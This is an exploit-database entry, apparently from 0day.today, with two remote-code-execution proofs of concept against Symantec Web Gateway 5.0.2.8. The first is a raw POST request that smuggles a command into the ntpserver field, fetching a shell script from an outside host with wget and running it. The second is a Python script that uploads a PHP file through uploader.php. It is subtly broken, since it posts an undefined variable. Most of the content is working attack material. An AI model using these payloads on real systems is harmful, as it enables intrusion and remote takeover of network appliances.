@@ -1,0 +1,94 @@
+id: 34213
+date: 04/09/2020
+title: Symantec Web Gateway 5.0.2.8 Remote Code Execution Exploit
+author: Cody Sixteen
+cves: 
+
+# Title: Postauth RCE in Symantec Web Gateway 5.0.2.8
+# Vendor: www.symantec.com
+# Vulnerable software: www.symantec.com
+# Repo: https://github.com/c610/free/
+
+
+
+
+POST /spywall/timeConfig.php HTTP/1.1
+Host: 192.168.216.133
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+Origin: https://192.168.216.133
+Connection: close
+Referer: https://192.168.216.133/spywall/timeConfig.php
+Cookie: PHPSESSID=8f076c1f7bac2b403cf39711fd301533
+Upgrade-Insecure-Requests: 1
+
+posttime=1585228657&saveForm=Save&timesync=1&ntpserver=qweqwe.com;$(wget%20http://192.168.1.170/a.sh%20-O%20/tmp/a.sh;sh%20/tmp/a.sh);#&timezone=5
+
+------------------------------------------
+
+# Title: Preauth RCE in Symantec Web Gateway 5.0.2.8
+# Vendor: www.symantec.com
+# Vulnerable software: www.symantec.com
+# Repo: https://github.com/c610/free/
+
+
+
+#!/usr/bin/env python
+# seemantech.py - small preauth poc for symantec web gateway
+# 27.03.2020 by code610
+#
+# more : https://twitter.com/CodySixteen
+#        https://code610.blogspot.com
+#
+# to use this bug:
+#   - uploads folder must exists on remote host
+#   - and it must be writable
+#
+# have fun
+#
+import sys, re
+import requests
+
+target = sys.argv[1]
+
+def main():
+  print 'symantec web gateway preauth rce poc'
+  print '      seemantech.py - vs - %s' % ( target )
+  print ''
+
+  baseUrl = target
+  uploadUrl = target + '/uploads/'
+
+  checkBase = requests.get(target,verify=False)
+  check_status = checkBase.status_code
+
+  if check_status == 200:
+    print '[+] target alive, checking uploads'
+
+    checkUpload = requests.get(uploadUrl, verify=False)
+    isthereupload = checkUpload.status_code
+
+    if isthereupload == 200:
+      print '[+] uploads exists! continuing...'
+
+      uploader = target + '/spywall/uploader.php'
+      upshell = open('sh.php','w')
+      upshell.write('<?php phpinfo();')
+      upshell.close()
+      up_data = {
+        'file':open('sh.php','rb')
+      }
+
+      upme = requests.post(uploader, files=files, verify=False)
+      upresp = upme.text
+      print upresp
+
+# run me:
+if __name__ == '__main__':
+  main()
+
+#  0day.today [2023-03-24]  #
